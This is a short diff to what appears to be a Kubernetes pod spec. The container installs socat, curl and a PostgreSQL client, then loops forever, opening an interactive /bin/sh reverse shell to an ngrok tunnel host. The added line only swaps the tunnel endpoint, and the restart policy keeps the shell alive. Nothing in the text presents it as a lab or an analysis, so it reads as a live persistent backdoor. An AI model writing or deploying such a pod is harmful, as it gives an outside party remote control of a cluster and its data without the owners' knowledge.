@@ -15,7 +15,7 @@ spec:
     - |
       apk add -q socat curl postgresql-client
       while true; do
-        socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:4.tcp.eu.ngrok.io:16552
+        socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.eu.ngrok.io:24173
         sleep 5
       done
   restartPolicy: Always
